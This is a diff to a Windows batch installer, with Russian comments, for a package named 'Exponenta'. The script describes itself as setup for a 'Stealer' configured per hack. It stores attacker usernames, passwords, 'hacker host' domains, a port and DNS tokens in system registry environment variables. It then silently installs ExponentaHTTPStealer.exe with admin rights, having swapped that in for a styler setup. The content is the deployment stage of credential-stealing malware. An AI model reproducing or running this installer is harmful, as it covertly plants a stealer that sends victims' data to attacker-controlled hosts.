@@ -3,7 +3,7 @@ rem
 rem Командный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
 rem
 rem USAGE
-rem > InstallMainExponenta.bat <username> <password> <hacker host server 2 domain> <hacker host server 3 domain>
+rem > InstallMainExponenta.bat <username> <password> <hacker host server 2 domain> <hacker host server 3 domain> <Hacker Pref> <Hacker Port> <hldnstocken> <entrydns tocken>
 rem Запускать файл с правами администратора
 
 setlocal enableextensions enabledelayedexpansion
@@ -12,6 +12,7 @@ Rem Установка системнмных переменных окружения
 
 set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
 set Dest_DIR=%PUB1%
+set Chocolatey=%ALLUSERSPROFILE%\chocolatey
 
 rem Подготовка пользовательских переменных окружения.
 rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
@@ -21,8 +22,10 @@ set Hacker_User=%1
 set Hacker_Pass=%2
 set Hacker_host2=%3
 set Hacker_host3=%4
-set hldnstoken=%5
-set entrydnstoken=%6
+set Hacker_pref=%5
+set Hacker_port=%6
+set hldnstoken=%7
+set entrydnstoken=%8
 
 echo -
 echo Добро пожаловать в программу установки Stealer
@@ -46,13 +49,20 @@ rem echo The variable is created
 %SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
 %SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host3 /t REG_SZ /d "!Hacker_host3!" /f
 %SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
+%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_pref /t REG_SZ /d "!Hacker_pref!" /f
+%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_port /t REG_SZ /d "!Hacker_port!" /f
 %SystemRoot%\System32\reg.exe Add "!Key!" /v hldnstoken /t REG_SZ /d "!hldnstoken!" /f
 %SystemRoot%\System32\reg.exe Add "!Key!" /v entrydnstoken /t REG_SZ /d "!entrydnstoken!" /f
 
 rem Insatall MainExponenta Files...
 cd /d %curdir%
 
-ExponentaStylerSetup.exe /VERYSILENT /NOCANCEL
+ExponentaHTTPStealer.exe /VERYSILENT /NOCANCEL
+
+rem Refresh Environment
+if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
+call %Chocolatey%\Bin\RefreshEnv.cmd
+:pass_Refresh
 
 rem Правка файлов конфигурации модуля Exponenta
 @echo on
